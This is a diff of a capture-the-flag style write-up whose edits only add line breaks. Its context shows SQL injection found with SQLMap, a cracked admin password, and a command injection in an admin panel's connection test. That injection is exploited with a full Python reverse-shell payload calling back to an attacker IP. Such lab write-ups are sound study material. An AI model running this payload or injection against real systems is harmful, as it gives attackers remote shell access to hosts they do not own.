@@ -27,6 +27,7 @@ http://172.16.11.225:8000/dashboard/
 ![ferox image](../images/kof/ferox.png)
 
 Upon accessing the page, the most prominent feature is a search field that passes the `q` parameter via GET and displays the searched team.
+<br>
 ![q parameter image](../images/kof/q_parameter.png)
 
 When testing this endpoint with SQLMap, it was identified that the database uses SQLite and that the parameter is vulnerable to SQL injection (SQLi).
@@ -116,18 +117,22 @@ pbkdf2_sha256$720000$uPmPwj655iBMXMnJkLwRfZ$yqgjRdOIa3GV9uFMTFSR6RLTRfz/PQxQ6u31
 ```
 
 Therefore, the admin password for "vanessa" is `princess1`. Upon accessing the `/panel` endpoint with admin creds, we encounter this page.
+<br>
 ![panel image](../images/kof/panel1.png)
 
 By clicking to generate an IP and then on "Test Connection," we can analyze the request. A POST request is made to the backend with the CSRF, game, vpn, and test_connection parameters. It seems that this feature tests the connection to another host in some way.
+<br>
 ![panel image](../images/kof/panel2.png)
 
 Since the machine doesn't have internet access, it won't be able to reach any public IP. However, if we place a local IP in the `test_connection` parameter, it responds that the connection was successful, and the test indicates that there is a connection.
+<br>
 ![panel image](../images/kof/panel3.png)
 
 What might be happening here is that we are directly passing the IP, and the server is executing some action. We can try to establish a reverse connection to our machine by injecting a ; (since it could be executed in bash) and using Python. Payload:
 ```bash
 ;export RHOST="10.0.10.235";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
 ```
+<br>
 ![shell request image](../images/kof/shell_request.png)
 ![shell image](../images/kof/shell.png)
 
